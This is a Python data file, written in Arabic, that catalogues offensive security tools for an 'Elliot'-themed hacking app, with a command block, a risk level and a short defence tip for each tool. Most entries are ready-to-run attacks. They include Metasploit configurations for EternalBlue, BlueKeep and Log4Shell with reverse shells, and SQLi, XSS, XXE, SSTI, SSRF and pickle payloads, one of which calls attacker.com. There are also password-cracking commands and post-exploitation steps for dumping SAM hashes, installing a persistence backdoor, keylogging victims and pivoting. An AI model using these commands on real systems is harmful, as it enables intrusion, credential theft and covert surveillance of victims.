TOOLS = [
    # ==================== الفحص ====================
    {
        "id": "nmap",
        "name": "Nmap",
        "cat": "scanner",
        "desc": "ماسح المنافذ والشبكات - أداة إليوت الأولى لرسم خريطة الهدف",
        "code": "nmap -sV -Pn -T4 --max-retries 2 --min-rate 150 <target>\n\n# فحص سريع:\nnmap -F <target>\n\n# فحص كل المنافذ:\nnmap -p- <target>\n\n# كشف نظام التشغيل:\nnmap -O <target>\n\n# فحص منافذ UDP:\nnmap -sU <target>\n\n# مثال كامل:\nnmap -sV -sC -O -p- -T4 192.168.1.1",
        "usage": "nmap -sV <target_ip>",
        "risk": "medium",
        "vaccine": "استخدم جدار حماية قوي وأغلق المنافذ غير المستخدمة"
    },
    {
        "id": "masscan",
        "name": "Masscan",
        "cat": "scanner",
        "desc": "أسرع ماسح منافذ في العالم - يفحص الإنترنت كله في 6 دقائق",
        "code": "# فحص نطاق كامل:\nmasscan -p1-65535 --rate=10000 <target>\n\n# فحص منافذ محددة:\nmasscan -p80,443,3306,8080 <target_range>\n\n# مثال:\nmasscan -p80,443 192.168.1.0/24 --rate=5000",
        "usage": "masscan -p<ports> --rate=<speed> <target>",
        "risk": "high",
        "vaccine": "راقب حركة الشبكة باستخدام IDS/IPS"
    },
    {
        "id": "arp_sweep",
        "name": "ARP Sweep",
        "cat": "scanner",
        "desc": "اكتشاف الأجهزة على الشبكة المحلية - أداة إليوت الصامتة",
        "code": "use auxiliary/scanner/discovery/arp_sweep\nset RHOSTS 192.168.1.0/24\nset THREADS 20\nrun",
        "usage": "arp-sweep <network_range>",
        "risk": "medium",
        "vaccine": "استخدم Static ARP entries أو ARPWatch"
    },
    {
        "id": "port_scan_tcp",
        "name": "TCP Port Scanner",
        "cat": "scanner",
        "desc": "ماسح المنافذ TCP المدمج في Metasploit",
        "code": "use auxiliary/scanner/portscan/tcp\nset RHOSTS <target>\nset PORTS 1-10000\nset THREADS 10\nset TIMEOUT 1000\nrun",
        "usage": "msfconsole -q -x 'use scanner/portscan/tcp; set RHOSTS <ip>; run'",
        "risk": "medium",
        "vaccine": "استخدم fail2ban لمنع محاولات المسح المتكررة"
    },
    {
        "id": "smb_version",
        "name": "SMB Version Scanner",
        "cat": "scanner",
        "desc": "كشف إصدار SMB - للبحث عن أهداف EternalBlue",
        "code": "use auxiliary/scanner/smb/smb_version\nset RHOSTS <target>\nset THREADS 10\nrun",
        "usage": "nmap --script smb-os-discovery <target>",
        "risk": "high",
        "vaccine": "عطل SMBv1 وحدث النظام باستمرار"
    },
    {
        "id": "http_version",
        "name": "HTTP Version Scanner",
        "cat": "scanner",
        "desc": "كشف إصدار خادم HTTP - لتحديد الثغرات المناسبة",
        "code": "use auxiliary/scanner/http/http_version\nset RHOSTS <target>\nset RPORT 80\nset THREADS 10\nrun",
        "usage": "curl -sI <target> | grep Server",
        "risk": "low",
        "vaccine": "أخفِ إصدار الخادم من الرؤوس (ServerTokens)"
    },

    # ==================== الاستغلال ====================
    {
        "id": "eternal_blue",
        "name": "EternalBlue (MS17-010)",
        "cat": "exploit",
        "desc": "ثغرة SMBv1 الشهيرة - استخدمها WannaCry و NotPetya",
        "code": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target_ip>\nset LHOST <your_ip>\nset LPORT 4444\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset TARGET 0\ncheck\nrun",
        "usage": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <ip>; run'",
        "risk": "critical",
        "vaccine": "ثبت التحديث MS17-010 فوراً وعطل SMBv1"
    },
    {
        "id": "bluekeep",
        "name": "BlueKeep (CVE-2019-0708)",
        "cat": "exploit",
        "desc": "ثغرة RDP القاتلة - تسمح بالدخول بدون كلمة مرور",
        "code": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS <target_ip>\nset LHOST <your_ip>\nset TARGET 2\ncheck\nrun",
        "usage": "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <ip>; run'",
        "risk": "critical",
        "vaccine": "ثبت آخر تحديثات أمان RDP واستخدم Network Level Authentication"
    },
    {
        "id": "log4shell",
        "name": "Log4Shell (CVE-2021-44228)",
        "cat": "exploit",
        "desc": "ثغرة Log4j - أثرت على ملايين الخوادم عالمياً",
        "code": "use exploit/multi/http/log4shell_header_injection\nset RHOSTS <target_ip>\nset RPORT 8080\nset LHOST <your_ip>\nset SRVHOST 0.0.0.0\nset PAYLOAD java/meterpreter/reverse_tcp\nrun",
        "usage": "msfconsole -q -x 'use exploit/multi/http/log4shell_header_injection; set RHOSTS <ip>; run'",
        "risk": "critical",
        "vaccine": "حدث Log4j إلى 2.17.0 أو أعلى"
    },
    {
        "id": "psexec",
        "name": "PsExec",
        "cat": "exploit",
        "desc": "تنفيذ أوامر عن بعد باستخدام SMB - يدعم Pass-the-Hash",
        "code": "use exploit/windows/smb/psexec\nset RHOSTS <target_ip>\nset SMBUser administrator\nset SMBPass <password_or_ntlm_hash>\nset LHOST <your_ip>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun",
        "usage": "msfconsole -q -x 'use exploit/windows/smb/psexec; set RHOSTS <ip>; set SMBUser admin; set SMBPass <pass>; run'",
        "risk": "high",
        "vaccine": "استخدم كلمات مرور قوية وفريدة للمسؤولين"
    },
    {
        "id": "shellshock",
        "name": "Shellshock (CVE-2014-6271)",
        "cat": "exploit",
        "desc": "ثغرة Bash - تسمح بتنفيذ أوامر عن بعد",
        "code": "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS <target_ip>\nset TARGETURI /cgi-bin/test.cgi\nset LHOST <your_ip>\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nrun",
        "usage": "curl -H 'User-Agent: () { :; }; /bin/bash -c \"command\"' <target>",
        "risk": "high",
        "vaccine": "حدث Bash إلى آخر إصدار"
    },
    {
        "id": "sqli_tester",
        "name": "Eliot SQLi Tester",
        "cat": "exploit",
        "desc": "فاحص SQL Injection - أداة إليوت المخصصة",
        "code": "# حمولات SQLi الكلاسيكية:\n' OR '1'='1\n' OR '1'='1' --\n' OR '1'='1' #\n\" OR \"1\"=\"1\n' UNION SELECT NULL--\n' UNION SELECT username,password FROM users--\n\n# مثال:\nhttp://victim.com/page.php?id=1' OR '1'='1' --",
        "usage": "أدخل الحمولة في البارامتر المستهدف",
        "risk": "high",
        "vaccine": "استخدم Prepared Statements و Parameterized Queries"
    },
    {
        "id": "xss_scanner",
        "name": "Eliot XSS Scanner",
        "cat": "exploit",
        "desc": "فاحص XSS المتقدم - يختبر GET و POST و Headers",
        "code": "# حمولات XSS:\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n<body onload=alert('XSS')>\n'><script>alert(1)</script>\n\"><script>alert(1)</script>\n\n# حقن في الرأس:\nX-Forwarded-For: <script>alert(1)</script>",
        "usage": "أدخل الحمولة في أي مدخل مستخدم",
        "risk": "high",
        "vaccine": "استخدم Content Security Policy (CSP) وتحقق من المدخلات"
    },
    {
        "id": "jwt_toolkit",
        "name": "JWT Toolkit",
        "cat": "exploit",
        "desc": "فك وتزوير رموز JWT - هجوم none و HS256",
        "code": "# هجوم none algorithm:\n# 1. فك التشفير:\necho <token> | cut -d'.' -f2 | base64 -d\n# 2. تغيير الخوارزمية:\n# في الـ header: {\"alg\":\"none\",\"typ\":\"JWT\"}\n# 3. إعادة التشفير:\necho -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64\n\n# هجوم HS256:\n# استخدم المفتاح العام ككلمة سر HS256\npython3 jwt_forgery.py <token> <public_key>",
        "usage": "python3 jwt_tool.py <token>",
        "risk": "high",
        "vaccine": "ارفض خوارزمية none وتحقق من توقيع RS256 فقط"
    },
    {
        "id": "nosql_injection",
        "name": "NoSQL Injection",
        "cat": "exploit",
        "desc": "حقن NoSQL (MongoDB) - حمولات $ne و $gt و $regex",
        "code": "# حمولات NoSQL:\n# JSON:\n{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}\n{\"$gt\": \"\"}\n{\"$regex\": \".*\"}\n\n# مثال POST:\ncurl -X POST http://victim.com/login -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
        "usage": "أرسل حمولة JSON إلى نقطة API",
        "risk": "high",
        "vaccine": "تحقق من أنواع المدخلات واستخدم mongoose validator"
    },
    {
        "id": "xxe_tester",
        "name": "XXE Tester",
        "cat": "exploit",
        "desc": "فاحص XXE Injection - قراءة ملفات النظام",
        "code": "<!-- حمولة XXE أساسية -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- حمولة OOB (Out-of-Band) -->\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">\n]>",
        "usage": "أرسل XML يحتوي على ENTITY إلى الخادم",
        "risk": "high",
        "vaccine": "عطل معالجة الكيانات الخارجية في XML parser"
    },
    {
        "id": "lfi_scanner",
        "name": "LFI Scanner",
        "cat": "exploit",
        "desc": "تضمين الملفات المحلية - قراءة ملفات حساسة",
        "code": "# حمولات LFI:\n../../../etc/passwd\n....//....//....//etc/passwd\n/etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php\n\n# مثال:\nhttp://victim.com/page.php?file=../../../etc/passwd",
        "usage": "جرب الحمولات في بارامترات الملفات",
        "risk": "high",
        "vaccine": "استخدم قائمة بيضاء للملفات المسموحة"
    },
    {
        "id": "ssti_detector",
        "name": "SSTI Detector",
        "cat": "exploit",
        "desc": "مكتشف حقن قوالب الخادم - Jinja2, Twig, Freemarker",
        "code": "# حمولات SSTI:\n{{7*7}}        # Jinja2 → 49\n${7*7}         # Freemarker → 49\n<%= 7*7 %>     # ERB\n#{7*7}         # Velocity\n\n# حمولة متقدمة لـ Jinja2:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "usage": "أدخل الحمولة في أي مدخل مستخدم",
        "risk": "critical",
        "vaccine": "لا تستخدم render_template_string مع مدخلات المستخدم"
    },
    {
        "id": "ssrf_exploiter",
        "name": "SSRF Exploiter",
        "cat": "exploit",
        "desc": "استغلال SSRF - استكشاف الشبكة الداخلية",
        "code": "# حمولات SSRF:\nhttp://127.0.0.1:8080/admin\nhttp://169.254.169.254/latest/meta-data/\nhttp://metadata.google.internal/\nfile:///etc/passwd\n\n# مثال:\nhttp://victim.com/proxy?url=http://169.254.169.254/",
        "usage": "استخدم حقلاً يقبل URLs لاستكشاف الداخلية",
        "risk": "high",
        "vaccine": "استخدم قائمة بيضاء للعناوين المسموحة"
    },
    {
        "id": "csrf_analyzer",
        "name": "CSRF Analyzer",
        "cat": "exploit",
        "desc": "محلل CSRF - فحص النماذج للثغرات",
        "code": "# فحص وجود CSRF token:\ncurl -s <target> | grep -i 'csrf\\|token\\|xsrf'\n\n# إنشاء صفحة هجوم:\n<html>\n  <body>\n    <form action=\"http://victim.com/transfer\" method=\"POST\">\n      <input name=\"amount\" value=\"1000\">\n      <input name=\"to\" value=\"attacker\">\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>",
        "usage": "افحص النماذج وابحث عن CSRF token",
        "risk": "medium",
        "vaccine": "استخدم CSRF tokens فريدة لكل جلسة"
    },
    {
        "id": "insecure_deserialize",
        "name": "Insecure Deserialization",
        "cat": "exploit",
        "desc": "فحص إزالة التسلسل غير الآمنة - PHP, Python, Java",
        "code": "# PHP:\nO:8:\"stdClass\":1:{s:4:\"name\";s:6:\"system\";}\n\n# Python Pickle:\ncos\nsystem\n(S'id'\ntR.\n\n# Java:\n# استخدم ysoserial لتوليد حمولات",
        "usage": "أرسل حمولة serialized إلى الخادم",
        "risk": "high",
        "vaccine": "لا تقبل serialized objects من المستخدم"
    },

    # ==================== OSINT ====================
    {
        "id": "theharvester",
        "name": "theHarvester",
        "cat": "osint",
        "desc": "جمع المعلومات الاستخباراتية - إيميلات، نطاقات فرعية، أسماء",
        "code": "# بحث أساسي:\ntheHarvester -d <target.com> -b google,linkedin\n\n# بحث شامل:\ntheHarvester -d <target.com> -b google,linkedin,github,shodan\n\n# مثال:\ntheHarvester -d tesla.com -b google -l 500 -f results.html",
        "usage": "theHarvester -d <domain> -b <source>",
        "risk": "low",
        "vaccine": "قلل المعلومات المنشورة عن شركتك على الإنترنت"
    },
    {
        "id": "sherlock",
        "name": "Sherlock",
        "cat": "osint",
        "desc": "صائد الأسماء - البحث عن اسم مستخدم عبر 300+ منصة",
        "code": "# تثبيت:\ngit clone https://github.com/sherlock-project/sherlock.git\npip install -r requirements.txt\n\n# استخدام:\npython3 sherlock <username>\n\n# مثال:\npython3 sherlock johndoe --output results",
        "usage": "python3 sherlock <username>",
        "risk": "low",
        "vaccine": "استخدم أسماء مستخدمين مختلفة لكل منصة"
    },
    {
        "id": "holehe",
        "name": "Holehe",
        "cat": "osint",
        "desc": "فحص البريد الإلكتروني - معرفة الخدمات المسجل بها",
        "code": "# تثبيت:\npip install holehe\n\n# استخدام:\nholehe <email>\n\n# مثال:\nholehe test@gmail.com",
        "usage": "holehe <email_address>",
        "risk": "low",
        "vaccine": "استخدم أيميلات مختلفة للخدمات المختلفة"
    },
    {
        "id": "subfinder",
        "name": "Subfinder",
        "cat": "osint",
        "desc": "اكتشاف النطاقات الفرعية - أداة ProjectDiscovery",
        "code": "# تثبيت:\ngo install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest\n\n# استخدام:\nsubfinder -d <target.com>\n\n# مثال:\nsubfinder -d google.com -o results.txt",
        "usage": "subfinder -d <domain>",
        "risk": "low",
        "vaccine": "راقب شهادات SSL الجديدة لنطاقك"
    },
    {
        "id": "whois",
        "name": "WHOIS",
        "cat": "osint",
        "desc": "معلومات تسجيل النطاق - تاريخ الإنشاء، المالك",
        "code": "# استخدام أساسي:\nwhois <target.com>\n\n# معلومات محددة:\nwhois <target.com> | grep -E 'Creation|Registrar|Name Server'\n\n# مثال:\nwhois example.com",
        "usage": "whois <domain>",
        "risk": "low",
        "vaccine": "فعّل WHOIS Privacy Protection"
    },
    {
        "id": "dig",
        "name": "DIG (DNS Query)",
        "cat": "osint",
        "desc": "استعلامات DNS - A, MX, NS, TXT, ANY",
        "code": "# سجلات مختلفة:\ndig <target.com> A\ndig <target.com> MX\ndig <target.com> NS\ndig <target.com> TXT\ndig <target.com> ANY\n\n# مثال:\ndig google.com ANY +noall +answer",
        "usage": "dig <domain> <record_type>",
        "risk": "low",
        "vaccine": "استخدم DNSSEC لتوقيع سجلاتك"
    },
    {
        "id": "geo_ip",
        "name": "Geo IP Locator",
        "cat": "osint",
        "desc": "تحديد الموقع الجغرافي من عنوان IP",
        "code": "# استخدام curl:\ncurl -s \"http://ip-api.com/json/<target_ip>\"\n\n# مثال:\ncurl -s \"http://ip-api.com/json/8.8.8.8\" | python3 -m json.tool",
        "usage": "curl -s 'http://ip-api.com/json/<ip>'",
        "risk": "low",
        "vaccine": "استخدم VPN لإخفاء عنوان IP الحقيقي"
    },
    {
        "id": "metadata_extractor",
        "name": "Metadata Extractor",
        "cat": "osint",
        "desc": "استخراج البيانات الوصفية - EXIF, PDF, DOCX",
        "code": "# صورة (EXIF):\nexiftool <image.jpg>\n\n# PDF:\npdfinfo <document.pdf>\n\n# DOCX:\npython3 -m docx2txt <document.docx>\n\n# مثال:\nexiftool -a -u -g1 photo.jpg",
        "usage": "exiftool <file>",
        "risk": "low",
        "vaccine": "امسح البيانات الوصفية قبل نشر الملفات"
    },

    # ==================== كسر كلمات المرور ====================
    {
        "id": "hydra",
        "name": "Hydra",
        "cat": "crack",
        "desc": "أداة تخمين كلمات المرور - تدعم 50+ بروتوكول",
        "code": "# SSH:\nhydra -l <user> -P <wordlist> ssh://<target>\n\n# FTP:\nhydra -l <user> -P <wordlist> ftp://<target>\n\n# HTTP POST:\nhydra -l <user> -P <wordlist> <target> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"\n\n# مثال:\nhydra -l admin -P /sdcard/rockyou.txt 192.168.1.1 ssh -t 4",
        "usage": "hydra -l <user> -P <wordlist> <target> <protocol>",
        "risk": "high",
        "vaccine": "استخدم rate limiting وكلمات مرور قوية"
    },
    {
        "id": "john",
        "name": "John the Ripper",
        "cat": "crack",
        "desc": "كاسر كلمات المرور من التجزئات - يدعم 100+ صيغة",
        "code": "# كسر هاش:\njohn --wordlist=<wordlist> <hash_file>\n\n# عرض النتائج:\njohn --show <hash_file>\n\n# مثال:\njohn --wordlist=/sdcard/rockyou.txt hash.txt --format=raw-md5",
        "usage": "john --wordlist=<wordlist> <hash_file>",
        "risk": "high",
        "vaccine": "استخدم Bcrypt أو Argon2 لتخزين كلمات المرور"
    },
    {
        "id": "hashcat",
        "name": "Hashcat",
        "cat": "crack",
        "desc": "أسرع كاسر كلمات مرور - يستخدم GPU",
        "code": "# MD5:\nhashcat -m 0 -a 0 <hash_file> <wordlist>\n\n# SHA256:\nhashcat -m 1400 -a 0 <hash_file> <wordlist>\n\n# مثال:\nhashcat -m 0 hash.txt /sdcard/rockyou.txt --force",
        "usage": "hashcat -m <type> -a <attack> <hash> <wordlist>",
        "risk": "high",
        "vaccine": "استخدم Salting و Peppering للهاشات"
    },
    {
        "id": "cewl",
        "name": "CeWL",
        "cat": "crack",
        "desc": "توليد قوائم كلمات من موقع ويب - Custom Wordlist Generator",
        "code": "# استخدام أساسي:\ncewl <target_url> -w output.txt\n\n# مع عمق أكبر:\ncewl -d 3 -m 5 <target_url> -w output.txt\n\n# مثال:\ncewl http://example.com -d 2 -m 6 -w custom_words.txt",
        "usage": "cewl <url> -w <output_file>",
        "risk": "low",
        "vaccine": "لا تستخدم كلمات مرتبطة بموقعك ككلمات مرور"
    },
    {
        "id": "crunch",
        "name": "Crunch",
        "cat": "crack",
        "desc": "توليد قوائم كلمات مخصصة - Wordlist Generator",
        "code": "# توليد كلمات من 4 إلى 6 أحرف:\ncrunch 4 6 abc123 -o wordlist.txt\n\n# مع نمط:\ncrunch 8 8 -t Pass@@@@ -o wordlist.txt\n\n# مثال:\ncrunch 3 5 0123456789 -o numeric.txt",
        "usage": "crunch <min> <max> <charset> -o <output>",
        "risk": "low",
        "vaccine": "استخدم كلمات مرور طويلة ومعقدة"
    },

    # ==================== الدفاع ====================
    {
        "id": "security_headers",
        "name": "Security Headers Checker",
        "cat": "defense",
        "desc": "فحص رؤوس الأمان HTTP - HSTS, X-Frame, CSP",
        "code": "# فحص الرؤوس:\ncurl -sI <target> | grep -E 'Strict-Transport|X-Frame|X-Content|Content-Security|X-XSS'\n\n# فحص مفصل:\nnmap --script http-security-headers <target>\n\n# مثال:\ncurl -sI https://example.com | grep -i security",
        "usage": "curl -sI <url> | grep -E '<headers>'",
        "risk": "low",
        "vaccine": "فعّل جميع رؤوس الأمان الموصى بها"
    },
    {
        "id": "cookie_analyzer",
        "name": "Cookie Analyzer",
        "cat": "defense",
        "desc": "تحليل الكوكيز - Secure, HttpOnly, SameSite",
        "code": "# فحص الكوكيز:\ncurl -sI <target> | grep -i 'set-cookie'\n\n# تحليل مفصل:\npython3 cookie_analyzer.py <target>\n\n# مثال:\ncurl -sI https://example.com | grep -i 'set-cookie' | grep -oP '(Secure|HttpOnly|SameSite)'",
        "usage": "curl -sI <url> | grep -i set-cookie",
        "risk": "low",
        "vaccine": "فعّل Secure, HttpOnly, و SameSite=Lax على كل الكوكيز"
    },
    {
        "id": "cors_checker",
        "name": "CORS Misconfig Checker",
        "cat": "defense",
        "desc": "فحص إعدادات CORS - كشف الثغرات الخطيرة",
        "code": "# اختبار CORS:\ncurl -sI -H \"Origin: https://evil.com\" <target>\n\n# البحث عن:\n# Access-Control-Allow-Origin: *\n# Access-Control-Allow-Credentials: true\n\n# مثال:\ncurl -sI -H \"Origin: https://evil.com\" https://api.example.com | grep -i access-control",
        "usage": "curl -sI -H 'Origin: <origin>' <url>",
        "risk": "medium",
        "vaccine": "حدد أصول محددة ولا تستخدم * مع Credentials"
    },
    {
        "id": "clickjacking",
        "name": "Clickjacking Detector",
        "cat": "defense",
        "desc": "فحص الحماية ضد النقر المخادع",
        "code": "# فحص X-Frame-Options:\ncurl -sI <target> | grep -i x-frame\n\n# فحص CSP frame-ancestors:\ncurl -sI <target> | grep -i 'content-security-policy' | grep -i 'frame-ancestors'\n\n# مثال:\ncurl -sI https://example.com | grep -iE 'x-frame|frame-ancestors'",
        "usage": "curl -sI <url> | grep -i x-frame-options",
        "risk": "medium",
        "vaccine": "استخدم X-Frame-Options: DENY أو CSP frame-ancestors 'none'"
    },
    {
        "id": "arp_watchdog",
        "name": "ARP Watchdog",
        "cat": "defense",
        "desc": "حارس الشبكة - كشف هجمات ARP Spoofing",
        "code": "# مراقبة جدول ARP:\nwatch -n 5 \"ip neigh | grep -v '00:00:00:00:00:00'\"\n\n# استخدام arp-scan:\narp-scan --localnet\n\n# كشف التغيرات:\nwhile true; do arp-scan --localnet | grep -v DUP; sleep 10; done",
        "usage": "watch -n 10 'ip neigh'",
        "risk": "medium",
        "vaccine": "استخدم Static ARP entries أو DAID (Dynamic ARP Inspection)"
    },
    {
        "id": "ssl_scanner",
        "name": "SSL/TLS Scanner",
        "cat": "defense",
        "desc": "فحص قوة تشفير SSL/TLS - كشف الثغرات",
        "code": "# فحص SSL:\nnmap --script ssl-enum-ciphers -p 443 <target>\n\n# استخدام testssl.sh:\n./testssl.sh <target>\n\n# مثال:\nnmap --script ssl-enum-ciphers -p 443 example.com",
        "usage": "nmap --script ssl-enum-ciphers -p 443 <target>",
        "risk": "medium",
        "vaccine": "عطل SSLv2/3 و TLS 1.0/1.1 واستخدم TLS 1.3"
    },

    # ==================== ما بعد الاختراق ====================
    {
        "id": "hashdump",
        "name": "Hashdump (SAM)",
        "cat": "post",
        "desc": "استخراج تجزئات كلمات المرور من SAM",
        "code": "use post/windows/gather/hashdump\nset SESSION 1\nrun\n\n# يدوياً:\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\nsamdump2 system.save sam.save",
        "usage": "msfconsole -q -x 'use post/windows/gather/hashdump; set SESSION 1; run'",
        "risk": "critical",
        "vaccine": "استخدم Credential Guard و LSA Protection"
    },
    {
        "id": "getsystem",
        "name": "GetSystem",
        "cat": "post",
        "desc": "رفع الصلاحيات إلى SYSTEM - أعلى صلاحية في ويندوز",
        "code": "# Meterpreter:\ngetsystem\ngetsystem -t 1  # Named Pipe Impersonation\ngetsystem -t 2  # Token Duplication\n\n# التحقق:\ngetuid",
        "usage": "getsystem",
        "risk": "critical",
        "vaccine": "ثبت آخر التحديثات الأمنية وراقب الصلاحيات"
    },
    {
        "id": "persistence",
        "name": "Persistence",
        "cat": "post",
        "desc": "تثبيت باب خلفي للعودة الدائمة",
        "code": "use post/windows/manage/persistence\nset SESSION 1\nset STARTUP SYSTEM\nset LHOST <your_ip>\nset LPORT 4444\nrun\n\n# إعادة الاتصال:\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST <your_ip>\nrun",
        "usage": "msfconsole -q -x 'use post/windows/manage/persistence; set SESSION 1; run'",
        "risk": "critical",
        "vaccine": "راقب مجلدات Startup و Run keys في التسجيل"
    },
    {
        "id": "keylogger",
        "name": "Keylogger",
        "cat": "post",
        "desc": "تسجيل ضغطات المفاتيح - التجسس على كل ما يكتبه الضحية",
        "code": "# داخل Meterpreter:\nkeyscan_start\n# ... انتظر ...\nkeyscan_dump\nkeyscan_stop\n\n# حفظ النتائج:\nkeyscan_dump > /tmp/keystrokes.txt",
        "usage": "keyscan_start → keyscan_dump → keyscan_stop",
        "risk": "critical",
        "vaccine": "استخدم Anti-Keylogger وقم بتحديث أنظمة الحماية"
    },
    {
        "id": "migrate",
        "name": "Process Migration",
        "cat": "post",
        "desc": "نقل الجلسة إلى عملية نظام للتمويه",
        "code": "# Meterpreter:\nps\nmigrate <PID>\n\n# أمثلة:\nmigrate 1234\nmigrate -N explorer.exe\nmigrate -N svchost.exe",
        "usage": "migrate <PID>",
        "risk": "high",
        "vaccine": "راقب سلوك العمليات غير الطبيعي"
    },
    {
        "id": "pivoting",
        "name": "Pivoting",
        "cat": "post",
        "desc": "استخدام الجهاز المخترق للوصول إلى الشبكة الداخلية",
        "code": "# Meterpreter:\nrun autoroute -s <subnet>\n\n# مثال:\nrun autoroute -s 10.10.10.0/24\n\n# فحص الشبكة الداخلية:\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24\nrun",
        "usage": "run autoroute -s <subnet>",
        "risk": "critical",
        "vaccine": "قسّم الشبكة (Network Segmentation) واستخدم VLANs"
    },

    # ==================== المنصات المتكاملة ====================
    {
        "id": "metasploit",
        "name": "Metasploit Framework",
        "cat": "framework",
        "desc": "إطار عمل إليوت الأساسي - يحتوي على آلاف الثغرات",
        "code": "# تشغيل:\nmsfconsole\n\n# مسح سريع:\nmsfconsole -q -x \"use auxiliary/scanner/portscan/tcp; set RHOSTS <target>; run; exit\"\n\n# استغلال:\nmsfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set LHOST <your_ip>; run\"",
        "usage": "msfconsole",
        "risk": "critical",
        "vaccine": "استخدمه فقط على أهداف مصرح بها"
    },
    {
        "id": "beef",
        "name": "BeEF",
        "cat": "framework",
        "desc": "إطار استغلال المتصفحات - يخترق الضحايا عبر متصفحاتهم",
        "code": "# تشغيل:\nsudo beef-xss\n\n# إدخال hook:\n<script src=\"http://<attacker_ip>:3000/hook.js\"></script>\n\n# فتح لوحة التحكم:\nhttp://localhost:3000/ui/panel",
        "usage": "beef-xss",
        "risk": "high",
        "vaccine": "استخدم NoScript وقم بتحديث المتصفح"
    },
    {
        "id": "set",
        "name": "SET (Social Engineering Toolkit)",
        "cat": "framework",
        "desc": "أداة الهندسة الاجتماعية - التصيد، الـ USB، المواقع المزيفة",
        "code": "# تشغيل:\nsudo setoolkit\n\n# خيارات شائعة:\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n\n# مثال:\nsetoolkit",
        "usage": "setoolkit",
        "risk": "high",
        "vaccine": "وعّي الموظفين ضد هجمات التصيد"
    },
    {
        "id": "empire",
        "name": "Empire (PowerShell)",
        "cat": "framework",
        "desc": "إطار عمل PowerShell - للتحكم في أنظمة ويندوز عن بعد",
        "code": "# تشغيل:\nempire\n\n# إنشاء Listener:\nuselistener http\nset Host http://<your_ip>:80\nexecute\n\n# إنشاء Stager:\nusestager windows/launcher_bat\nset Listener http\nexecute",
        "usage": "empire",
        "risk": "critical",
        "vaccine": "عطل PowerShell لغير المسؤولين"
    },
    {
        "id": "cobalt_strike",
        "name": "Cobalt Strike",
        "cat": "framework",
        "desc": "منصة محاكاة الفريق الأحمر - الأقوى في العالم",
        "code": "# محاكاة أوامر Cobalt Strike:\n# إنشاء Beacon:\nbeacon> spawn x64\nbeacon> inject 1234 x64 http\n\n# استخراج الهاشات:\nbeacon> hashdump\nbeacon> logonpasswords\n\n# التحرك الجانبي:\nbeacon> jump psexec <target> <listener>",
        "usage": "محاكاة Cobalt Strike",
        "risk": "critical",
        "vaccine": "راقب حركة الشبكة لاتصالات C2 المشبوهة"
    },
    {
        "id": "toolx",
        "name": "Tool-X",
        "cat": "framework",
        "desc": "منصة أدوات اختبار الاختراق المتكاملة - 70+ أداة",
        "code": "# تثبيت:\ngit clone https://github.com/rajkumardusad/Tool-X.git\ncd Tool-X\nchmod +x install.aex\nbash install.aex\n\n# تشغيل:\ntoolx",
        "usage": "toolx",
        "risk": "high",
        "vaccine": "لا تقم بتثبيت أدوات غير موثوقة"
    },
]

CATEGORIES = {
    "scanner": {"label": "الفحص", "icon": "🔍", "color": "#00ffcc"},
    "exploit": {"label": "الاستغلال", "icon": "⚔️", "color": "#ff007f"},
    "osint": {"label": "OSINT", "icon": "🌐", "color": "#ffbd2e"},
    "crack": {"label": "كسر كلمات المرور", "icon": "🔓", "color": "#ff6600"},
    "defense": {"label": "الدفاع", "icon": "🛡️", "color": "#7c4dff"},
    "post": {"label": "ما بعد الاختراق", "icon": "📌", "color": "#50fa7b"},
    "framework": {"label": "المنصات المتكاملة", "icon": "🛠️", "color": "#ff9500"},
}
